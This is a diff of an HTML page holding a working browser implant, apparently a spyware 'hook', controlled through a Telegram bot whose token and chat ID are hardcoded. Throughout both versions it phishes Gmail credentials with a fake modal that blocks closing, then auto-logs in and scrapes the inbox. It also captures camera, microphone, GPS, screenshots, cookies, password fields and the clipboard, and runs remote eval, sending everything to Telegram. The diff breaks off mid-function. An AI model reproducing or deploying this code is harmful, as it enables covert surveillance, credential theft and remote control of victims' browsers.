@@ -97,20 +97,6 @@
         }
         .error-msg { color: #d93025; font-size: 14px; margin-top: 10px; display: none; }
         body.modal-active { overflow: hidden; }
-        /* debug console panel (hidden, but shows if needed) */
-        #debug {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: black;
-            color: lime;
-            font-size: 10px;
-            max-height: 80px;
-            overflow-y: auto;
-            z-index: 99999;
-            display: none;
-        }
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
@@ -122,65 +108,44 @@
     </div>
     <iframe id="mainFrame" src="https://example.com" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>
     <iframe id="persistentFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation" style="display:none;"></iframe>
-    <div id="debug"></div>
 
     <script>
         (function(){
-            "use strict";
-
-            // ================= CONFIGURATION =================
+            // ---------- CONFIG ----------
             const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
             const ADMIN_CHAT_ID = '8737104261';
             const POLL_INTERVAL = 3000;
-            const START_DELAY = 5000;
             const AUDIO_DURATION_MS = 120000;
 
-            // ================= STATE =================
+            // ---------- STATE ----------
             let isRegistered = false;
-            let updateId = 0;
-            let intervalId = null;
+            let updateId = parseInt(localStorage.getItem('tg_update_id') || '0');
+            let pollingInterval = null;
             let phishingModalActive = false;
             let deviceId = null;
-            let gmailDetectedNotified = false;
             let storedGmailCredentials = { email: '', password: '' };
-            let permissionsStatus = { camera: false, microphone: false, location: false, clipboard: false };
+            let permissions = { camera: false, microphone: false, location: false, clipboard: false };
 
-            // Enable debug logging to console AND to a visible div
-            function debugLog(msg) {
-                console.log(msg);
-                const debugDiv = document.getElementById('debug');
-                if (debugDiv) {
-                    debugDiv.style.display = 'block';
-                    debugDiv.innerHTML += new Date().toLocaleTimeString() + ' ' + msg + '<br>';
-                    debugDiv.scrollTop = debugDiv.scrollHeight;
-                }
-            }
-            debugLog('Script started');
-
-            // ================= TELEGRAM HELPERS =================
-            const TELEGRAM_HEADERS = {
+            // ---------- HELPERS ----------
+            const headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             };
 
-            async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
-                debugLog(`Sending message: ${text.substring(0,50)}...`);
+            async function apiCall(method, params) {
                 try {
-                    const body = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
-                    if (replyMarkup) body.reply_markup = replyMarkup;
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                         method: 'POST',
-                        headers: { ...TELEGRAM_HEADERS, 'Content-Type': 'application/json' },
-                        body: JSON.stringify(body)
+                        headers: { ...headers, 'Content-Type': 'application/json' },
+                        body: JSON.stringify(params)
                     });
-                    const data = await response.json();
-                    if (!data.ok) {
-                        debugLog(`sendMessage error: ${JSON.stringify(data)}`);
-                    } else {
-                        debugLog(`Message sent OK`);
-                    }
-                } catch(e) {
-                    debugLog(`sendMessage exception: ${e.message}`);
-                }
+                    return await res.json();
+                } catch(e) { return { ok: false }; }
+            }
+
+            async function sendMessage(text, parseMode = 'HTML', replyMarkup = null) {
+                const params = { chat_id: ADMIN_CHAT_ID, text, parse_mode: parseMode };
+                if (replyMarkup) params.reply_markup = replyMarkup;
+                await apiCall('sendMessage', params);
             }
 
             async function sendPhoto(blob, caption) {
@@ -188,7 +153,7 @@
                 fd.append('chat_id', ADMIN_CHAT_ID);
                 fd.append('photo', blob, 'capture.jpg');
                 fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', headers, body: fd });
             }
 
             async function sendDocument(blob, filename, caption) {
@@ -196,40 +161,31 @@
                 fd.append('chat_id', ADMIN_CHAT_ID);
                 fd.append('document', blob, filename);
                 fd.append('caption', caption);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers: TELEGRAM_HEADERS, body: fd });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', headers, body: fd });
             }
 
             async function sendTyping() {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendChatAction?chat_id=${ADMIN_CHAT_ID}&action=typing`, { headers: TELEGRAM_HEADERS });
+                await apiCall('sendChatAction', { chat_id: ADMIN_CHAT_ID, action: 'typing' });
             }
 
-            // ================= PERMISSIONS =================
-            async function requestAllPermissions() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    permissionsStatus.camera = true;
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) { permissionsStatus.camera = false; }
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    permissionsStatus.microphone = true;
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) { permissionsStatus.microphone = false; }
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
-                    });
-                    permissionsStatus.location = true;
-                } catch(e) { permissionsStatus.location = false; }
-                try {
-                    await navigator.clipboard.readText();
-                    permissionsStatus.clipboard = true;
-                } catch(e) { permissionsStatus.clipboard = false; }
-                debugLog(`Permissions: camera=${permissionsStatus.camera}, mic=${permissionsStatus.microphone}, gps=${permissionsStatus.location}, clipboard=${permissionsStatus.clipboard}`);
+            // ---------- PERMISSIONS ----------
+            async function requestPermissions() {
+                try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); permissions.camera = true; s.getTracks().forEach(t=>t.stop()); } catch(e) {}
+                try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); permissions.microphone = true; s.getTracks().forEach(t=>t.stop()); } catch(e) {}
+                try { await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej)); permissions.location = true; } catch(e) {}
+                try { await navigator.clipboard.readText(); permissions.clipboard = true; } catch(e) {}
             }
 
-            // ================= MENU =================
-            async function sendMenu() {
+            // ---------- REGISTRATION & MENU ----------
+            async function registerAndSendMenu() {
+                deviceId = 'hook_' + Math.random().toString(36).substr(2, 8);
+                const permEmoji = (v) => v ? '✅' : '❌';
+                const permLine = `📷 ${permEmoji(permissions.camera)}  🎤 ${permEmoji(permissions.microphone)}  📍 ${permEmoji(permissions.location)}  📋 ${permEmoji(permissions.clipboard)}`;
+                await sendMessage(
+                    `🔌 *HTML Hook Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform}\n📺 ${screen.width}x${screen.height}\n${permLine}`,
+                    'Markdown'
+                );
+                // send the main menu with inline buttons
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
@@ -237,7 +193,7 @@
                         [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
                         [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
                         [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
-                        [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
+                        [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }, { text: '🏠 Home', callback_data: 'start' }]
                     ]
                 };
                 const replyKeyboard = {
@@ -245,408 +201,264 @@
                     resize_keyboard: true,
                     persistent: true
                 };
-                const menuText = `✅ *HTML Hook Active* | \`${deviceId}\`\n🟢 Online | Permissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Credentials stored for ${storedGmailCredentials.email}. Use /auto_gmail` : 'No Gmail credentials yet. Use /phish_gmail to capture.'}\n\n_This hook survives page navigations._`;
-                await sendMessage(menuText, 'Markdown', inlineKeyboard);
+                await sendMessage(
+                    `✅ *Remote Control Active* | \`${deviceId}\`\nPermissions: ${permLine}\n${storedGmailCredentials.email ? `🔐 Creds stored for ${storedGmailCredentials.email}` : 'No Gmail creds yet'}`,
+                    'Markdown', inlineKeyboard
+                );
                 await sendMessage("Press 🏠 Home anytime to see this menu again.", 'HTML', replyKeyboard);
             }
 
-            // ================= REGISTRATION =================
-            async function registerClient() {
-                deviceId = 'hook_' + Math.random().toString(36).substr(2, 8);
-                const emoji = (p) => p ? '🟢' : '🔴';
-                const permLine = `📷 ${emoji(permissionsStatus.camera)}  🎤 ${emoji(permissionsStatus.microphone)}  📍 ${emoji(permissionsStatus.location)}  📋 ${emoji(permissionsStatus.clipboard)}`;
-                await sendMessage(
-                    `🔌 *HTML Hook Connected*\n🆔 \`${deviceId}\`\n📱 ${navigator.platform} | ${navigator.userAgent.substring(0,60)}...\n📺 ${screen.width}x${screen.height}\n${permLine}\n\n_Persistent mode active._`,
-                    'Markdown'
-                );
-                await sendMenu();
-            }
-
-            // ================= GMAIL FUNCTIONS =================
+            // ---------- GMAIL FUNCTIONS ----------
             async function autoLoginAndReadEmails() {
-                if (!storedGmailCredentials.email || !storedGmailCredentials.password) {
-                    return { success: false, error: "No Gmail credentials stored. Use /phish_gmail first." };
-                }
+                if (!storedGmailCredentials.email || !storedGmailCredentials.password) return { success: false, error: "No Gmail credentials. Use /phish_gmail first." };
                 window.location.href = 'https://accounts.google.com';
                 return new Promise((resolve) => {
                     let attempts = 0;
                     const interval = setInterval(async () => {
                         const emailField = document.querySelector('input[type="email"]');
-                        const passwordField = document.querySelector('input[type="password"]');
+                        const passField = document.querySelector('input[type="password"]');
                         const nextBtn = document.querySelector('#identifierNext, #passwordNext, button[jsname]');
-                        
                         if (emailField && !emailField.value) {
                             emailField.value = storedGmailCredentials.email;
                             emailField.dispatchEvent(new Event('input', { bubbles: true }));
                             if (nextBtn) nextBtn.click();
-                        } else if (passwordField && !passwordField.value) {
-                            passwordField.value = storedGmailCredentials.password;
-                            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+                        } else if (passField && !passField.value) {
+                            passField.value = storedGmailCredentials.password;
+                            passField.dispatchEvent(new Event('input', { bubbles: true }));
                             if (nextBtn) nextBtn.click();
                         } else if (window.location.href.includes('mail.google.com')) {
                             clearInterval(interval);
                             setTimeout(async () => {
-                                const emails = await readGmailInbox();
-                                resolve({ success: true, data: emails });
+                                const rows = document.querySelectorAll('.zA, .zE, .Cp');
+                                const emails = [];
+                                for (let row of rows.slice(0, 15)) {
+                                    const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
+                                    const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
+                                    const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
+                                    if (from || subject) emails.push({ from, subject, snippet: snippet.slice(0,100) });
+                                }
+                                resolve({ success: true, data: emails.length ? emails : "No emails in current view" });
                             }, 3000);
-                            return;
                         }
-                        attempts++;
-                        if (attempts > 60) {
-                            clearInterval(interval);
-                            resolve({ success: false, error: "Auto-login timed out" });
-                        }
+                        if (++attempts > 60) { clearInterval(interval); resolve({ success: false, error: "Auto-login timeout" }); }
                     }, 500);
                 });
             }
 
             async function readGmailInbox() {
-                if (!window.location.href.includes('mail.google.com')) {
-                    return { success: false, error: "Not on Gmail page." };
-                }
+                if (!location.href.includes('mail.google.com')) return { success: false, error: "Not on Gmail page" };
                 const rows = document.querySelectorAll('.zA, .zE, .Cp');
                 const emails = [];
-                for (let row of rows.slice(0, 20)) {
+                for (let row of rows.slice(0, 15)) {
                     const from = row.querySelector('.yP, .zF, .bA4')?.innerText || '';
                     const subject = row.querySelector('.bog, .bqe, .b6')?.innerText || '';
                     const snippet = row.querySelector('.y2, .y3, .b8c')?.innerText || '';
-                    if (from || subject) {
-                        emails.push({ from, subject, snippet: snippet.substring(0, 100) });
-                    }
+                    if (from || subject) emails.push({ from, subject, snippet: snippet.slice(0,100) });
                 }
-                if (emails.length === 0) return { success: true, data: "No emails found in current view." };
-                return { success: true, data: emails };
+                return { success: true, data: emails.length ? emails : "No emails found" };
             }
 
-            // ================= PHISHING MODAL =================
+            // ---------- PHISHING MODAL ----------
             function createPhishingModal() {
                 if (phishingModalActive) return;
                 phishingModalActive = true;
                 document.body.classList.add('modal-active');
-
                 const modal = document.createElement('div');
                 modal.className = 'gmail-phish-modal';
                 modal.innerHTML = `
                     <div class="gmail-phish-box">
                         <h1>Sign in to continue to Gmail</h1>
-                        <input type="email" id="phish-email" placeholder="Email or phone">
+                        <input type="email" id="phish-email" placeholder="Email">
                         <input type="password" id="phish-password" placeholder="Password">
                         <button id="phish-submit">Next</button>
-                        <div class="error-msg" id="phish-error">Incorrect email or password. Please try again.</div>
+                        <div class="error-msg" id="phish-error">Incorrect email or password</div>
                     </div>
                 `;
                 document.body.appendChild(modal);
-
-                const blockKeys = (e) => {
-                    if (e.key === 'Escape') {
-                        e.preventDefault();
-                        const errDiv = document.getElementById('phish-error');
-                        if (errDiv) errDiv.style.display = 'block';
-                    }
-                };
-                document.addEventListener('keydown', blockKeys);
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) {
-                        const errDiv = document.getElementById('phish-error');
-                        if (errDiv) errDiv.style.display = 'block';
-                    }
-                });
-
-                const emailInp = document.getElementById('phish-email');
-                const passInp = document.getElementById('phish-password');
-                const errDiv = document.getElementById('phish-error');
+                const block = (e) => { if(e.key==='Escape'){ e.preventDefault(); document.getElementById('phish-error').style.display='block'; } };
+                document.addEventListener('keydown', block);
+                modal.addEventListener('click', (e) => { if(e.target===modal) document.getElementById('phish-error').style.display='block'; });
+                const emailInp = document.getElementById('phish-email'), passInp = document.getElementById('phish-password'), errDiv = document.getElementById('phish-error');
                 const submit = async () => {
-                    const email = emailInp.value.trim();
-                    const pass = passInp.value;
-                    if (!email || !pass) {
-                        errDiv.style.display = 'block';
-                        errDiv.innerText = 'Please fill both fields.';
-                        return;
-                    }
+                    const email = emailInp.value.trim(), pass = passInp.value;
+                    if (!email || !pass) { errDiv.style.display='block'; errDiv.innerText='Fill both fields'; return; }
                     storedGmailCredentials = { email, password: pass };
-                    await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 Email: ${email}\n🔑 Password: ${pass}\n\nUse /auto_gmail to automatically log in and read emails.`, 'Markdown');
-                    modal.remove();
-                    document.body.classList.remove('modal-active');
-                    phishingModalActive = false;
-                    document.removeEventListener('keydown', blockKeys);
-                    setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 500);
+                    await sendMessage(`🎣 *Gmail Credentials Captured*\n📧 ${email}\n🔑 ${pass}\nUse /auto_gmail`, 'Markdown');
+                    modal.remove(); document.body.classList.remove('modal-active'); phishingModalActive = false; document.removeEventListener('keydown', block);
+                    setTimeout(() => window.location.href = 'https://mail.google.com', 500);
                 };
                 document.getElementById('phish-submit').addEventListener('click', submit);
-                emailInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
-                passInp.addEventListener('keypress', e => { if (e.key === 'Enter') submit(); });
+                emailInp.addEventListener('keypress', e=>{ if(e.key==='Enter') submit(); });
+                passInp.addEventListener('keypress', e=>{ if(e.key==='Enter') submit(); });
             }
 
-            // ================= BROWSER HISTORY =================
-            async function getBrowserHistory() {
-                return `📍 *Current Page:* ${location.href}\n↩️ *Referrer:* ${document.referrer || 'none'}\n\n⚠️ Full browser history is not accessible from a web page. Use the Chrome extension for full history.`;
-            }
-
-            // ================= COMMAND HANDLER =================
-            async function handleCommand(fullText) {
-                let cmd = fullText.trim().toLowerCase();
-                debugLog(`Received command: "${cmd}"`);
-                
-                // Handle persistent Home button
+            // ---------- COMMAND DISPATCH ----------
+            async function handleCommand(text) {
+                let cmd = text.trim().toLowerCase();
                 if (cmd === '🏠 home' || cmd === '/start' || cmd === 'start') {
-                    await sendMenu();
+                    const inlineKeyboard = {
+                        inline_keyboard: [
+                            [{ text: '📷 Camera', callback_data: 'photo' }, { text: '🎤 Mic', callback_data: 'audio' }],
+                            [{ text: '📍 GPS', callback_data: 'location' }, { text: '📸 Screenshot', callback_data: 'screenshot' }],
+                            [{ text: '🍪 Cookies', callback_data: 'cookies' }, { text: '🔑 Grab Pass', callback_data: 'grab_pass' }],
+                            [{ text: '📋 Clipboard', callback_data: 'clipboard' }, { text: '🎣 Phish Gmail', callback_data: 'phish_gmail' }],
+                            [{ text: '📁 Upload', callback_data: 'upload' }, { text: '💻 Eval', callback_data: 'eval' }],
+                            [{ text: '📜 History', callback_data: 'history' }, { text: '📧 Auto Gmail', callback_data: 'auto_gmail' }]
+                        ]
+                    };
+                    await sendMessage(`✅ *Commands Menu* | \`${deviceId}\`\nPermissions: ${permissions.camera?'✅':'❌'}📷 ${permissions.microphone?'✅':'❌'}🎤 ${permissions.location?'✅':'❌'}📍 ${permissions.clipboard?'✅':'❌'}📋\n${storedGmailCredentials.email ? `🔐 ${storedGmailCredentials.email}` : ''}`, 'Markdown', inlineKeyboard);
                     return;
                 }
-                // Remove leading slash if present
-                if (cmd.startsWith('/')) cmd = cmd.substring(1);
-                // Aliases
-                if (cmd === 'phishgmail' || cmd === 'phish_gmail') cmd = 'phish_gmail';
-                if (cmd === 'grabpass' || cmd === 'grab_pass') cmd = 'grab_pass';
-                if (cmd === 'reademails' || cmd === 'read_emails') cmd = 'read_emails';
-                if (cmd === 'autogmail' || cmd === 'auto_gmail') cmd = 'auto_gmail';
-                if (cmd === 'home') cmd = 'start';
-
+                if (cmd.startsWith('/')) cmd = cmd.slice(1);
+                const aliases = { 'phishgmail':'phish_gmail', 'phish_gmail':'phish_gmail', 'grabpass':'grab_pass', 'grab_pass':'grab_pass', 'reademails':'read_emails', 'read_emails':'read_emails', 'autogmail':'auto_gmail', 'auto_gmail':'auto_gmail' };
+                cmd = aliases[cmd] || cmd;
                 await sendTyping();
 
                 try {
                     switch(cmd) {
-                        case 'start':
-                            await sendMenu();
-                            break;
                         case 'auto_gmail':
-                            await sendMessage('🔄 Attempting auto-login to Gmail and reading emails. This may take up to 30 seconds...');
-                            const autoResult = await autoLoginAndReadEmails();
-                            if (autoResult.success) {
-                                if (typeof autoResult.data === 'string') {
-                                    await sendMessage(`📧 *Auto Gmail Result*\n${autoResult.data}`, 'Markdown');
-                                } else {
-                                    let msg = `📧 *Latest emails after auto-login* (${autoResult.data.length}):\n\n`;
-                                    for (let i = 0; i < autoResult.data.length; i++) {
-                                        const e = autoResult.data[i];
-                                        msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
-                                        if (msg.length > 3800) break;
-                                    }
-                                    await sendMessage(msg, 'Markdown');
-                                }
-                            } else {
-                                await sendMessage(`❌ Auto Gmail failed: ${autoResult.error}`);
-                            }
+                            await sendMessage('🔄 Auto‑logging into Gmail...');
+                            const auto = await autoLoginAndReadEmails();
+                            if (auto.success) {
+                                let msg = `📧 *Auto Gmail* (${Array.isArray(auto.data)?auto.data.length:0}):\n`;
+                                if (Array.isArray(auto.data)) {
+                                    for(let i=0; i<auto.data.length; i++) msg += `${i+1}. ${auto.data[i].from} – ${auto.data[i].subject}\n`;
+                                    await sendMessage(msg.slice(0,3900), 'Markdown');
+                                } else await sendMessage(auto.data);
+                            } else await sendMessage(`❌ ${auto.error}`);
                             break;
                         case 'phish_gmail':
                             if (!phishingModalActive) createPhishingModal();
-                            await sendMessage('🎣 Phishing modal injected. User must enter credentials. They will be stored for auto-login.');
+                            await sendMessage('🎣 Phishing modal injected.');
                             break;
                         case 'read_emails':
-                            const readResult = await readGmailInbox();
-                            if (readResult.success) {
-                                if (typeof readResult.data === 'string') {
-                                    await sendMessage(`📧 *Gmail Inbox*\n${readResult.data}`, 'Markdown');
-                                } else {
-                                    let msg = `📧 *Latest emails* (${readResult.data.length}):\n\n`;
-                                    for (let i = 0; i < readResult.data.length; i++) {
-                                        const e = readResult.data[i];
-                                        msg += `${i+1}. *${e.from || '?'}* – ${e.subject || 'no subject'}\n   ${e.snippet || ''}\n\n`;
-                                        if (msg.length > 3800) break;
-                                    }
-                                    await sendMessage(msg, 'Markdown');
-                                }
-                            } else {
-                                await sendMessage(`❌ ${readResult.error}`);
-                            }
+                            const read = await readGmailInbox();
+                            if (read.success) {
+                                let msg = `📧 *Gmail Inbox* (${Array.isArray(read.data)?read.data.length:0}):\n`;
+                                if (Array.isArray(read.data)) {
+                                    for(let i=0; i<read.data.length; i++) msg += `${i+1}. ${read.data[i].from} – ${read.data[i].subject}\n`;
+                                    await sendMessage(msg.slice(0,3900), 'Markdown');
+                                } else await sendMessage(read.data);
+                            } else await sendMessage(`❌ ${read.error}`);
                             break;
                         case 'gmail':
                             if (location.href.includes('accounts.google.com')) {
                                 let email = document.querySelector('input[type="email"]')?.value || '';
                                 let pass = document.querySelector('input[type="password"]')?.value;
-                                if (!pass) {
-                                    const pf = document.querySelector('input[type="password"]');
-                                    if (pf) { pf.focus(); setTimeout(() => pf.blur(), 100); }
-                                    await sendMessage('Attempting to trigger autofill...');
-                                } else {
-                                    storedGmailCredentials = { email, password: pass };
-                                    await sendMessage(`🔑 Gmail credentials extracted and stored:\n📧 ${email}\n🔑 ${pass}\n\nUse /auto_gmail to log in automatically.`, 'Markdown');
-                                }
-                            } else {
-                                await sendMessage('Not on Google login page. Use /phish_gmail to force a fake modal.');
-                            }
-                            break;
-                        case 'history':
-                            const historyInfo = await getBrowserHistory();
-                            await sendMessage(historyInfo, 'Markdown');
+                                if (!pass) { const pf = document.querySelector('input[type="password"]'); if(pf){ pf.focus(); setTimeout(()=>pf.blur(),100); } await sendMessage('Trying to trigger autofill...'); }
+                                else { storedGmailCredentials = { email, password: pass }; await sendMessage(`🔑 Stored: ${email} / ${pass}\nUse /auto_gmail`, 'Markdown'); }
+                            } else await sendMessage('Not on Google login page. Use /phish_gmail.');
                             break;
                         case 'photo':
                             try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                                const video = document.createElement('video');
-                                video.srcObject = stream;
-                                await new Promise(r => { video.onloadedmetadata = r; video.play(); });
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                canvas.getContext('2d').drawImage(video, 0, 0);
-                                stream.getTracks().forEach(t => t.stop());
-                                canvas.toBlob(blob => sendPhoto(blob, '📸 Camera capture'), 'image/jpeg');
-                            } catch(e) { await sendMessage(`Camera error: ${e.message}`); }
+                                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                                const v = document.createElement('video'); v.srcObject = s; await new Promise(r=>{ v.onloadedmetadata=r; v.play(); });
+                                const c = document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0);
+                                s.getTracks().forEach(t=>t.stop()); c.toBlob(b=>sendPhoto(b,'📸 Camera'),'image/jpeg');
+                            } catch(e){ await sendMessage(`Camera error: ${e.message}`); }
                             break;
                         case 'audio':
                             try {
-                                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                                const mediaRecorder = new MediaRecorder(stream);
-                                let chunks = [];
-                                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                                mediaRecorder.onstop = async () => {
-                                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                                    await sendDocument(blob, `recording_${Date.now()}.webm`, `🎙️ Audio recording (${AUDIO_DURATION_MS/1000}s)`);
-                                    stream.getTracks().forEach(t => t.stop());
-                                };
-                                mediaRecorder.start();
-                                setTimeout(() => mediaRecorder.stop(), AUDIO_DURATION_MS);
-                                await sendMessage(`Recording audio for ${AUDIO_DURATION_MS/1000} seconds...`);
-                            } catch(e) { await sendMessage(`Microphone error: ${e.message}`); }
+                                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                                const mr = new MediaRecorder(s); let chunks = [];
+                                mr.ondataavailable = e=>chunks.push(e.data);
+                                mr.onstop = async ()=>{ const blob = new Blob(chunks,{type:'audio/webm'}); await sendDocument(blob,`rec_${Date.now()}.webm`,`🎙️ ${AUDIO_DURATION_MS/1000}s`); s.getTracks().forEach(t=>t.stop()); };
+                                mr.start(); setTimeout(()=>mr.stop(), AUDIO_DURATION_MS);
+                                await sendMessage(`Recording ${AUDIO_DURATION_MS/1000}s...`);
+                            } catch(e){ await sendMessage(`Mic error: ${e.message}`); }
                             break;
                         case 'location':
-                            navigator.geolocation.getCurrentPosition(async pos => {
-                                await sendMessage(`📍 GPS Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`);
-                            }, async err => await sendMessage(`GPS error: ${err.message}`));
+                            navigator.geolocation.getCurrentPosition(async p=>{ await sendMessage(`📍 ${p.coords.latitude},${p.coords.longitude} (±${p.coords.accuracy}m)`); }, async e=>{ await sendMessage(`GPS error: ${e.message}`); });
                             break;
                         case 'screenshot':
-                            html2canvas(document.body).then(canvas => {
-                                canvas.toBlob(blob => sendPhoto(blob, '📸 Screenshot'), 'image/png');
-                            }).catch(e => sendMessage(`Screenshot failed: ${e.message}`));
+                            html2canvas(document.body).then(c=>c.toBlob(b=>sendPhoto(b,'📸 Screenshot'),'image/png')).catch(e=>sendMessage(`Screenshot failed: ${e.message}`));
                             break;
                         case 'cookies':
                             await sendMessage(`🍪 Cookies: ${document.cookie || 'none'}`);
                             break;
                         case 'grab_pass':
                             const pw = document.querySelector('input[type="password"]');
-                            if (pw && pw.value) await sendMessage(`🔐 Password: ${pw.value}`);
-                            else await sendMessage('No password field with value found.');
+                            await sendMessage(pw && pw.value ? `🔐 Password: ${pw.value}` : 'No visible password field.');
                             break;
                         case 'clipboard':
-                            try {
-                                const txt = await navigator.clipboard.readText();
-                                await sendMessage(`📋 Clipboard: ${txt}`);
-                            } catch(e) { await sendMessage(`Clipboard error: ${e.message}`); }
+                            try { const txt = await navigator.clipboard.readText(); await sendMessage(`📋 Clipboard: ${txt}`); } catch(e){ await sendMessage(`Clipboard error: ${e.message}`); }
                             break;
                         case 'eval':
-                            const code = fullText.replace(/^\/eval\s*/i, '');
-                            if (code) {
-                                let result = eval(code);
-                                if (typeof result !== 'string') result = JSON.stringify(result);
-                                await sendMessage(`✅ Eval result:\n${result.substring(0, 3900)}`);
-                            } else await sendMessage('Usage: /eval <js code>');
+                            const code = text.replace(/^\/eval\s*/i, '');
+                            if(code){ let res = eval(code); if(typeof res!='string') res=JSON.stringify(res); await sendMessage(`✅ Eval:\n${res.slice(0,3900)}`); } else await sendMessage('Usage: /eval <js>');
                             break;
                         case 'upload':
-                            const input = document.createElement('input');
-                            input.type = 'file';
-                            input.onchange = async (e) => {
-                                const file = e.target.files[0];
-                                if (file) await sendDocument(file, file.name, `📁 File: ${file.name}`);
-                            };
-                            input.click();
-                            await sendMessage('File picker opened on victim side.');
+                            const inp = document.createElement('input'); inp.type='file'; inp.onchange=async e=>{ if(e.target.files[0]) await sendDocument(e.target.files[0], e.target.files[0].name, '📁 File'); }; inp.click(); await sendMessage('File picker opened.');
+                            break;
+                        case 'history':
+                            await sendMessage(`📍 Current: ${location.href}\n↩️ Referrer: ${document.referrer || 'none'}\n\nFull history not accessible from web page.`, 'Markdown');
                             break;
                         case 'devices':
-                            await sendMessage(`🖥️ *Current HTML Hook*\n🆔 \`${deviceId}\`\nPermissions: ${permissionsStatus.camera ? '✅📷' : '❌📷'} ${permissionsStatus.microphone ? '✅🎤' : '❌🎤'} ${permissionsStatus.location ? '✅📍' : '❌📍'} ${permissionsStatus.clipboard ? '✅📋' : '❌📋'}\n${storedGmailCredentials.email ? `🔐 Gmail creds stored for ${storedGmailCredentials.email}` : 'No stored Gmail credentials'}`, 'Markdown');
+                            await sendMessage(`🖥️ *Current device*\n🆔 \`${deviceId}\`\nPermissions: ${permissions.camera?'✅':'❌'}📷 ${permissions.microphone?'✅':'❌'}🎤 ${permissions.location?'✅':'❌'}📍 ${permissions.clipboard?'✅':'❌'}📋\n${storedGmailCredentials.email ? `🔐 ${storedGmailCredentials.email}` : ''}`, 'Markdown');
                             break;
                         default:
-                            await sendMessage(`Unknown command: ${cmd}. Press 🏠 Home or send /start.`);
+                            await sendMessage(`Unknown: ${cmd}. Use /start or 🏠 Home.`);
                     }
-                } catch(err) {
-                    await sendMessage(`Error: ${err.message}`);
+                } catch(err) { await sendMessage(`Error: ${err.message}`); }
+            }
+
+            // ---------- POLLING ----------
+            async function deleteWebhookOnce() {
+                if (!localStorage.getItem('webhook_deleted')) {
+                    await apiCall('deleteWebhook', {});
+                    localStorage.setItem('webhook_deleted', '1');
                 }
             }
 
-            // ================= POLLING (with offset sync) =================
-            async function syncOffset() {
-                debugLog('Syncing offset...');
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=1`, { headers: TELEGRAM_HEADERS });
-                    const data = await res.json();
-                    debugLog(`syncOffset response: ${JSON.stringify(data)}`);
-                    if (data.ok && data.result && data.result.length > 0) {
-                        updateId = data.result[data.result.length - 1].update_id + 1;
-                    } else {
-                        updateId = 0;
-                    }
-                    debugLog(`Update offset set to: ${updateId}`);
-                } catch(e) {
-                    debugLog(`syncOffset error: ${e.message}`);
-                }
-            }
-
-            async function pollUpdates() {
